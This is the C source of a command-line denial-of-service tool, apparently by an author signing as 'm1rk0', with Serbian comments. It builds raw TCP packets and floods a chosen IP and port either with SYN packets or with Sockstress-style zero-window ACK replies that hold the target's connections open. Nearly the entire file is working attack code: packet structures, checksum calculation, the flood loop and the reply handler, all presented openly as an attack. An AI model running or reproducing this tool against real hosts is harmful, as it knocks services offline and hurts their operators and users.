#include "main.h"

int tcp_flag; //ako je podesena na 0 bice obican SYNFLOOD
//ako ne onda ce biti SOCKSTRESS

#pragma pack(push)
#pragma pack(1)
struct ip_header
{
    unsigned char version_ihl;
    unsigned char type_of_service;
    uint16_t length;
    uint32_t scnd_line;
    unsigned char ttl;
    unsigned char protocol;
    uint16_t checksum;
    uint32_t source_addr;
    uint32_t dest_addr;
    uint32_t options;
};

struct tcp_header
{
    uint16_t source_port;
    uint16_t destination_port;
    uint32_t seq;
    uint32_t ack;
    uint16_t off_res_flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urg_ptr;
    uint32_t opts_pad;
};
#pragma pack(pop)

struct global_args
{
    uint16_t attack_port;
    struct in_addr attack_ip;
    struct sockaddr_in iface_addr;
    int syn_delay;
    unsigned char payload[MAX_PAYLOAD_SIZE];
    size_t payload_size;
} globalArgs;

struct pckt_det
{
    unsigned long syn_sent;
    unsigned long ack_sent;
    unsigned long synack_recv;
    unsigned long ack_recv;
    unsigned long rst_recv;
} packetDetails;

void intro(int t);
void parseArgs(int argc, char** argv);
void initDetails();
int get_iface_ip(struct sockaddr_in *ip, char *iface);
void *process_incoming(void *arg);
void *print_status(void *arg);
void *send_packet(void* arg);
void send_ack(unsigned char *packet);
void calc_tcp_checksum(unsigned char* packet, unsigned long packet_length, struct in_addr src, struct in_addr dst);
void loadPayload(char *path);

int main(int argc, char** argv)
{
    system("clear");
    parseArgs(argc, argv);
    initDetails();
    
    pthread_t packet_processor;
    pthread_t packet_sender;
    pthread_t status_updater;

    pthread_create(&packet_processor, NULL, process_incoming, NULL);
    pthread_create(&packet_sender, NULL, send_packet, NULL);
    pthread_create(&status_updater, NULL, print_status, NULL);

    pthread_join(packet_processor, NULL);
    pthread_join(packet_sender, NULL);
    pthread_join(status_updater, NULL);

    return 0;
}

void *print_status(void *arg)
{
    char* sig[4] = {"ooo", "Ooo", "oOo", "ooO"};
    int i = 0;
    printf(BOLDWHITE"\t\t[!] Launching the attack!\n"RESET);
    //printf(BOLDWHITE"\t\t[!] Zapocinjem napad!\n"RESET);
    sleep(1);
    while(1)
    {
        printf(BOLDWHITE"\t[%s]"RESET" "BOLD"POSLATO:"RESET" syn: "BOLDWHITE"%lu"RESET" ack: "BOLDWHITE"%lu"RESET" "BOLD"PRIMLJENO:"RESET" synack: "BOLDWHITE"%lu"RESET" ack: "BOLDWHITE"%lu"RESET" rst: "BOLDWHITE"%lu"RESET"\r", sig[++i%4],
                packetDetails.syn_sent, packetDetails.ack_sent, packetDetails.synack_recv, packetDetails.ack_recv, packetDetails.rst_recv);
        fflush(stdout);
        usleep(100000);
    }
}

void* process_incoming(void* arg)
{
    int s_listen = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if(s_listen < 0){
        printf("Neuspelo\n");
        exit(1);}

    struct sockaddr_in localhost;
    localhost.sin_family = AF_INET;
    localhost.sin_addr.s_addr = INADDR_ANY;

    bind(s_listen, (struct sockaddr*)&localhost, sizeof(localhost));
    unsigned char packet_buffer[10000];

    while(1)
    {
        int count = recv(s_listen, packet_buffer, 10000, 0);
        struct ip_header *ip = (struct ip_header*)packet_buffer;
        struct tcp_header *tcp = (struct tcp_header*)(packet_buffer + 4*(ip->version_ihl & 0x0F));

        if(ip->source_addr == globalArgs.attack_ip.s_addr && ip->protocol == 6)
        {
            struct in_addr src_addr;
            src_addr.s_addr = ip->source_addr;

            int urg, ack, psh, rst, syn, fin;

            urg = tcp->off_res_flags & htons(0x0020);
            ack = tcp->off_res_flags & htons(0x0010);
            psh = tcp->off_res_flags & htons(0x0008);
            rst = tcp->off_res_flags & htons(0x0004);
            syn = tcp->off_res_flags & htons(0x0002);
            fin = tcp->off_res_flags & htons(0x0001);

            if(DEBUGMODE)
            {
                printf("[d] Got %d byte TCP packet from %s\n", count, inet_ntoa(src_addr));
                printf("[d]\t SEQ: %lx    ACK: %lx\n", (long)ntohl(tcp->seq), (long)ntohl(tcp->ack));
                printf("[d]\t SRC: %d     DST: %d\n", (int)ntohs(tcp->source_port), (int)ntohs(tcp->destination_port));
                printf("[d]\t IP CHECKSUM %lx   TCP CHECKSUM %lx\n", (long)ip->checksum, (long)tcp->checksum);
                printf("[d]\t FLAGS: ");
                if(urg)
                    printf("URG ");
                if(ack)
                    printf("ACK ");
                if(psh)
                    printf("PSH ");
                if(rst)
                    printf("RST ");
                if(syn)
                    printf("SYN ");
                if(fin)
                    printf("FIN ");

                printf("\n[d]\t WINDOW: %d", tcp->window);
                printf("\n");
            }

            if(syn && ack)
            {
                packetDetails.synack_recv++;
                //if(tcp_flag == 1)
                send_ack(packet_buffer);
                packetDetails.ack_sent++;
            }
            else if(ack)
            {
                packetDetails.ack_recv++;
                //if(tcp_flag == 1)
                send_ack(packet_buffer);
            }
            else if(rst)
            {
                packetDetails.rst_recv++;
            }
        }
    }

    return NULL;
}

void send_ack(unsigned char *packet)
{
    static int s_out = -1;
    if(s_out == -1)
    {
        s_out = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s_out < 0)
        {
            printf("RIPBRAH\n");
            exit(1);
        }
        if(bind(s_out, (struct sockaddr*)&globalArgs.iface_addr, sizeof(struct sockaddr_in))==-1){
            printf("Error: ...\n");
            exit(1);
        }
    }

    struct sockaddr_in attack_addr;
    attack_addr.sin_family = AF_INET;
    attack_addr.sin_addr = globalArgs.attack_ip;

    struct ip_header *ip = (struct ip_header*)packet;
    struct tcp_header *synack = (struct tcp_header*)(packet + 4*(ip->version_ihl & 0x0F));

    unsigned char reply[sizeof(struct tcp_header) + MAX_PAYLOAD_SIZE];
    struct tcp_header *ack = (struct tcp_header*)reply;
    ack->source_port = synack->destination_port;
    ack->destination_port = synack->source_port;
    ack->ack = synack->seq; // Only add 1 if it's a synack (done below)
    ack->seq = synack->ack;
    
    ack->off_res_flags = 0;
    // set data offset
    ack->off_res_flags |= htons(0x6000);
    // set ack flag
    ack->off_res_flags |= htons(0x0010);

    ack->window = 0; // zero window to make the other side wait
    ack->urg_ptr = 0;
    ack->opts_pad = 0;

    // If the received packet is a SYNACK, attach the payload
    unsigned long packet_size = sizeof(struct tcp_header);
    if(synack->off_res_flags & htons(0x0010) && synack->off_res_flags & htons(0x0002))
    {
        ack->ack = htonl(ntohl(synack->seq) + 1);
        ack->seq = synack->ack;
        memcpy(reply + sizeof(struct tcp_header), globalArgs.payload, globalArgs.payload_size);
        packet_size += globalArgs.payload_size;
    }

    calc_tcp_checksum(reply, packet_size, globalArgs.iface_addr.sin_addr, attack_addr.sin_addr);
    int ret = sendto(s_out, reply, packet_size, 0,
            (struct sockaddr*)&attack_addr, sizeof(struct sockaddr_in));
    if(ret == -1)
        perror("[!] Error sending ACK/SYNACK packet");
    //send(s_out, "ee", sizeof("ee"), 0);
}

void* send_packet(void* arg)
{
    int s_out;
    if((s_out = socket(AF_INET, SOCK_RAW, IPPROTO_TCP))<0){
        printf("Neuspelo kreiranje socketa\n");
        exit(1);}
    //printf("NOV SOCKET %d\n", s_out);

    if(bind(s_out, (struct sockaddr*)&globalArgs.iface_addr, sizeof(struct sockaddr_in)) == -1){
        printf("Neuspeo bind...\n");
        exit(1);}

    struct tcp_header tcp;
    struct sockaddr_in attack_addr;
    attack_addr.sin_family = AF_INET;
    attack_addr.sin_addr = globalArgs.attack_ip;

    while(1)
    {
        tcp.source_port = (rand() & 0xFFFF) | 0x8000;
        tcp.destination_port = htons(globalArgs.attack_port);
        tcp.seq = htonl(rand());
        tcp.ack = 0;

        tcp.off_res_flags = 0;

        tcp.off_res_flags |= htons(0x6000);//data offset
        tcp.off_res_flags |= htons(0x0002);//SYN flag
        tcp.window = 1000;
        tcp.urg_ptr = 0;
        tcp.opts_pad = 0;

        calc_tcp_checksum((unsigned char*)&tcp, sizeof(struct tcp_header), globalArgs.iface_addr.sin_addr, attack_addr.sin_addr);

        int ret = sendto(s_out, &tcp, sizeof(struct tcp_header), 0, (struct sockaddr*)&attack_addr, sizeof(struct sockaddr_in));
        if(ret == -1)
            perror("[!]Error sending SYN packet\n");
        packetDetails.syn_sent++;
        usleep(globalArgs.syn_delay);
    }
    
    return NULL;
}

#define ADD_16BIT_OVERFLOW(x) x = (x + (1&(x >> 16))) & 0xFFFF;

void calc_tcp_checksum(unsigned char *packet, unsigned long packet_length, struct in_addr src, struct in_addr dst)
{

    uint32_t checksum = 0;

    // Pseudo Header
    uint32_t source_ip = ntohl(src.s_addr);
    uint32_t dest_ip = ntohl(dst.s_addr);

    // Source Address
    checksum += (source_ip >> 16) & 0xFFFF;
    ADD_16BIT_OVERFLOW(checksum);
    checksum += source_ip & 0x0000FFFF;
    ADD_16BIT_OVERFLOW(checksum);

    // Destination Address
    checksum += (dest_ip >> 16) & 0xFFFF;
    ADD_16BIT_OVERFLOW(checksum);
    checksum += dest_ip & 0x0000FFFF;
    ADD_16BIT_OVERFLOW(checksum);

    // zero||protocol
    checksum += 0x0006;
    ADD_16BIT_OVERFLOW(checksum);

    //TCP length
    checksum += packet_length;
    ADD_16BIT_OVERFLOW(checksum);

    // Set the checksum field to 0
    struct tcp_header *tcp = (struct tcp_header*)packet;
    tcp->checksum = 0;

    int i;
    for(i = 0; i < packet_length / 2; i++)
    {
        // Read the 16-bit word in the correct endianness
        uint16_t block = (packet[i * 2] << 8) | packet[i * 2 + 1];
        checksum += block;
        ADD_16BIT_OVERFLOW(checksum);
    }

    if(packet_length % 2 == 1)
    {
        uint16_t last_block = packet[packet_length-1] << 8;
        checksum += last_block;
        ADD_16BIT_OVERFLOW(checksum);
    }

    // actual checksum is the one's compliment of the one's compliment sum
    tcp->checksum = htons(~checksum);
}

void initDetails()
{
    packetDetails.syn_sent = 0;
    packetDetails.ack_sent = 0;
    packetDetails.ack_recv = 0;
    packetDetails.rst_recv = 0;
    packetDetails.synack_recv = 0;
}

void intro(int t)
{
    printf("\n");
    usleep(t);
    printf(BOLDMAGENTA"\t\t┌┬┐┌─┐┌┐┌┬┌─┐┬      ┌─┐┌─┐  ┌─┐┌─┐┬─┐┬  ┬┬┌─┐┌─┐\n");
    usleep(t);
    printf("\t\t ││├┤ ││││├─┤│      │ │├┤   └─┐├┤ ├┬┘└┐┌┘││  ├┤ \n");
    usleep(t);
    printf("\t\t─┴┘└─┘┘└┘┴┴ ┴┴─┘────└─┘└────└─┘└─┘┴└─ └┘ ┴└─┘└─┘\n");
    usleep(t);
    printf("\n");
    usleep(t);
    if(tcp_flag==1)
        printf("\t\t           CVE-2008-4609 - \"Sockstress\"       \n");
    else if(tcp_flag==0)
        printf("\t\t          CVE-2017-1000020 - \"SYN Flood\"       \n");
    usleep(t);
    printf("\t                                          m1rk0.\n\n"RESET);
    usleep(t);
}

void parseArgs(int argc, char** argv)
{
    if(argc<4)
    {
        if(argc==2 && strcmp(argv[1], "-h")==0)
        {
            printf(BOLDMAGENTA"Usage: ./dos <ip address> <port> [interface] --options\n"RESET);
            printf(BOLDMAGENTA"options:\n\t-A ACK packet attack known as \"Sockstress\"\n\t-S SYN packet attack known as \"SYNFlood\"\n"RESET);
            exit(1);
        }
        else
        {
            printf(BOLDMAGENTA"Usage: ./dos <ip address> <port> [interface] --options\n"RESET);
            exit(1);
        }
    }
    else
    {
        tcp_flag=1;
        globalArgs.attack_port = 0;
        globalArgs.syn_delay = DEF_DELAY;
        globalArgs.payload_size = 0;

//PARSE IP ADDRESS PORT AND IFACE
        int ip_index = 1;
        int port_index = 2;
        int iface_index = 3;

        if(get_iface_ip(&globalArgs.iface_addr, argv[iface_index]) == 0)
        {
            printf("Netacan interfejs %s\n", argv[iface_index]);
            exit(1);
        }

        char *ip = argv[ip_index];
        char *port = argv[port_index];

        globalArgs.attack_port = atoi(port);
        if(globalArgs.attack_port == 0){
            printf("Neipravan port...\n");
            exit(1);}

        if(inet_aton(ip, &globalArgs.attack_ip) == 0){
            printf("Neipsravna adresa...\n");
            exit(1);}

//PARSUJEM ARGUMENTE
        if(argc==5)
        {
            if(strcmp(argv[4], "-S")==0)
            {
                tcp_flag=0;
            }
            else if(strcmp(argv[4], "-A")==0)
            {
                tcp_flag=1;
            }
            else
            {
            printf(BOLDMAGENTA"Usage: ./dos <ip address> <port> [interface] --options\n"RESET);
            }
        }

        intro(100000);
        sleep(1);
	printf("\t\t[+] Interface initialised %s (%s)\n", argv[iface_index], inet_ntoa(globalArgs.iface_addr.sin_addr));
	//printf("\t\t[+] Inicijalizovan interfejs %s (%s)\n", argv[iface_index], inet_ntoa(globalArgs.iface_addr.sin_addr));
        sleep(1);	
        printf("\t\t[+] Destination address detected: %s:%hu...\n", ip, globalArgs.attack_port);
        //printf("\t\t[+] Ciljna adresa otkrivena: %s:%hu...\n", ip, globalArgs.attack_port);
        sleep(1);
    }
}

int get_iface_ip(struct sockaddr_in *ip, char *iface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    int ret = ioctl(fd, SIOCGIFADDR, &ifr);
    if(ret != 0)
    {
        return 0;
    }
    close(fd);
    ip->sin_family = AF_INET;
    ip->sin_addr = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr;
    return 1;
}
